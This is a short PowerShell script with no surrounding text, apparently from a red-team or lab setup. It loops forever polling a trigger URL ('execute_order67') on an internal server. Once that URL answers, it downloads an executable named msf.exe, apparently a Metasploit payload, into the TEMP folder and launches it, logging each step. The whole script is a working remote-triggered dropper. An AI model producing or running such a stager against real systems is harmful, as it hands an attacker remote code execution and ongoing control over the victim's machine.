$fileServerUrl = "http://10.25.10.18:8448"
$flagUrl = "$fileServerUrl/execute_order67"
$payloadUrl = "$fileServerUrl/msf.exe"
$localPath = "$env:TEMP\msf.exe"
$pollInterval = 60
$logPath = "C:\poll_payload.log"

function Log($msg) {
    $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $msg"
    Add-Content -Path $logPath -Value $line
}

Log "Poller started. Polling for flag at $flagUrl ..."

while ($true) {
    try {
        $response = Invoke-WebRequest -Uri $flagUrl -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop
        Log "Poll response: $($response.StatusCode)"
        if ($response.StatusCode -eq 200) {
            Log "Flag found, waiting for orders..."
            Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
            Log "Executing Order 67..."
            Start-Process -FilePath $localPath
            Start-Sleep -Seconds $pollInterval
        }
    } catch {
        Log "Poll failed: $($_.Exception.Message)"
    }
    Start-Sleep -Seconds $pollInterval
}